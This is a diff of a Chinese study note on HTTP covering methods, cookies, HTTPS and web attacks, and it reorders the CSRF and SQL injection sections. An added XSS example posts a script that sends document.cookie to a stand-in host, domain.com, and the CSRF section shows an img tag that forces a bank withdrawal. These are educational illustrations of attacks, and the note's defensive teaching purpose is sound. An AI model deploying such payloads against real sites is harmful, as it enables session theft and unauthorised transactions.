@@ -41,8 +41,8 @@
 * [七、Web 攻击技术](#七web-攻击技术)
     * [攻击模式](#攻击模式)
     * [跨站脚本攻击](#跨站脚本攻击)
-    * [SQL 注入攻击](#sql-注入攻击)
     * [跨站点请求伪造](#跨站点请求伪造)
+    * [SQL 注入攻击](#sql-注入攻击)
     * [拒绝服务攻击](#拒绝服务攻击)
 * [八、各版本比较](#八各版本比较)
     * [HTTP/1.0 与 HTTP/1.1 的区别](#http10-与-http11-的区别)
@@ -67,7 +67,7 @@
 
 URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。
 
-<div align="center"> <img src="../pics//url_diagram.png" width=""/> </div><br>
+<div align="center"> <img src="../pics//f716427a-94f2-4875-9c86-98793cf5dcc3.jpg" width="400"/> </div><br>
 
 ## 请求和响应报文
 
@@ -97,6 +97,10 @@ POST 主要目的不是获取资源，而是传输存储在内容实体中的数
 
 GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体。
 
+GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。
+
+GET 和 POST 的另一个区别是，使用 GET 方法，浏览器会把 HTTP Header 和 Data 一并发送出去，服务器响应 200（OK）并返回数据。而使用 POST 方法，浏览器先发送 Header，服务器响应 100（Continue）之后，浏览器再发送 Data，最后服务器响应 200（OK）并返回数据。
+
 ```
 GET /test/demo_form.asp?name1=value1&name2=value2 HTTP/1.1
 ```
@@ -106,10 +110,6 @@ POST /test/demo_form.asp HTTP/1.1
 Host: w3schools.com
 name1=value1&name2=value2
 ```
-
-GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。
-
-GET 和 POST 的另一个区别是，使用 GET 方法，浏览器会把 HTTP Header 和 Data 一并发送出去，服务器响应 200（OK）并返回数据。而使用 POST 方法，浏览器先发送 Header，服务器响应 100（Continue）之后，浏览器再发送 Data，最后服务器响应 200（OK）并返回数据。
 
 ## HEAD
 
@@ -172,7 +172,7 @@ DELETE /file.html HTTP/1.1
 
 > 要求用隧道协议连接代理
 
-要求在于代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。
+要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。
 
 ```html
 CONNECT www.example.com:443 HTTP/1.1
@@ -342,7 +342,16 @@ Host: www.example.org
 Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 ```
 
-### 2. Set-Cookie
+### 2. 分类
+
+- 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
+- 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。
+
+```html
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+```
+
+### 3. Set-Cookie
 
 | 属性 | 说明 |
 | :--: | -- |
@@ -353,17 +362,19 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 | Secure | 仅在 HTTPs 安全通信时才会发送 Cookie |
 | HttpOnly | 加以限制，使 Cookie 不能被 JavaScript 脚本访问 |
 
-### 3. Session 和 Cookie 区别
+### 4. Session 和 Cookie 区别
 
 Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。
 
-### 4. 浏览器禁用 Cookie 的情况
+### 5. 浏览器禁用 Cookie 的情况
 
 会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。
 
-### 5. 使用 Cookie 实现用户名和密码的自动填写
+### 6. 使用 Cookie 实现用户名和密码的自动填写
 
 网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。
+
+但是如果 Set-Cookie 指定了 HttpOnly 属性，就无法通过 Javascript 脚本获取 Cookie 信息，这是出于安全性考虑。
 
 ## 缓存
 
@@ -448,7 +459,7 @@ Content-Type: text/plain
 
 如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。
 
-在请求报文首部中添加 Range 字段，然后指定请求的范围，例如 Range:bytes=5001-10000。请求成功的话服务器发送 206 Partial Content 状态。
+在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。
 
 ```html
 GET /z4d4kWk.jpg HTTP/1.1
@@ -504,9 +515,11 @@ HTTP 有以下安全性问题：
 2. 不验证通信方的身份，通信方的身份有可能遭遇伪装；
 3. 无法证明报文的完整性，报文有可能遭篡改。
 
-HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Socket Layer）通信，再由 SSL 和 TCP 通信。通过使用 SSL，HTTPs 提供了加密、认证和完整性保护。
+HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Socket Layer）通信，再由 SSL 和 TCP 通信。也就是说使用了隧道进行通信。
 
-<div align="center"> <img src="../pics//ssl-offloading.jpg" width=""/> </div><br>
+通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。
+
+<div align="center"> <img src="../pics//ssl-offloading.jpg" width="700"/> </div><br>
 
 ## 加密
 
@@ -521,7 +534,7 @@ HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Socket Layer）通信
 
 ### 2. 公开密钥
 
-（Public-Key Encryption）而公开密钥加密使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。
+（Public-Key Encryption），使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。
 
 - 优点：更为安全；
 - 缺点：运算速度慢；
@@ -530,7 +543,7 @@ HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Socket Layer）通信
 
 ### 3. HTTPs 采用的加密方式
 
-HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。
+HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key 就是对称密钥）
 
 <div align="center"> <img src="../pics//How-HTTPS-Works.png" width="600"/> </div><br>
 
@@ -538,17 +551,18 @@ HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称�
 
 通过使用  **证书**  来对通信方进行认证。
 
-<div align="center"> <img src="../pics//mutualssl_small.png" width=""/> </div><br>
 
 数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。
 
 进行 HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。
 
+<div align="center"> <img src="../pics//mutualssl_small.png" width=""/> </div><br>
+
 使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。
 
 ## 完整性
 
-SSL 提供摘要功能来验证完整性。
+SSL 提供报文摘要功能来验证完整性。
 
 # 七、Web 攻击技术
 
@@ -560,13 +574,27 @@ SSL 提供摘要功能来验证完整性。
 
 ### 2. 被动攻击
 
-设下圈套，让用户发送有攻击代码的 HTTP 请求，那么用户发送了该 HTTP 请求之后就会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。
+设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。
 
 ## 跨站脚本攻击
 
 ### 1. 概念
 
 （Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。
+
+例如有一个论坛网站，攻击者可以在上面发表以下内容：
+
+```html
+<script>location.href="//domain.com/?c=" + document.cookie</script>
+```
+
+之后该内容可能会被渲染成以下形式：
+
+```html
+<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
+```
+
+另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
 
 ### 2. 危害
 
@@ -594,6 +622,44 @@ SSL 提供摘要功能来验证完整性。
    header('Content-Type: text/javascript; charset=utf-8');
 ?>
 ```
+
+## 跨站点请求伪造
+
+### 1. 概念
+
+（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
+
+XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。
+
+假如一家银行用以执行转账操作的 URL 地址如下：
+
+```
+http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
+```
+
+那么，一个恶意攻击者可以在另一个网站上放置如下代码：
+
+```
+<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
+```
+
+如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。
+
+这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
+
+透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
+
+### 2. 防范手段
+
+（一）检查 Referer 字段
+
+HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。
+
+这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
+
+（二）添加校验 Token
+
+由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 token 的值为空或者错误，拒绝这个可疑请求。
 
 ## SQL 注入攻击
 
@@ -644,36 +710,6 @@ strSQL = "SELECT * FROM users;"
 - 如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。
 - 其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。
 - 使用 SQL 防注入系统。
-
-## 跨站点请求伪造
-
-### 1. 概念
-
-（Cross-site request forgery，XSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
-
-XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。
-
-假如一家银行用以执行转账操作的 URL 地址如下：http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
-
-那么，一个恶意攻击者可以在另一个网站上放置如下代码：&lt;img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
-
-如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。
-
-这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
-
-透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
-
-### 2. 防范手段
-
-（一）检查 Referer 字段
-
-HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。
-
-这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
-
-（二）添加校验 Token
-
-由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 token 的值为空或者错误，拒绝这个可疑请求。
 
 ## 拒绝服务攻击
 
@@ -733,3 +769,4 @@ HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。
 - [维基百科：SQL 注入攻击](https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A)
 - [维基百科：跨站点请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
 - [维基百科：拒绝服务攻击](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
+- [What is the difference between a URI, a URL and a URN?](https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn)
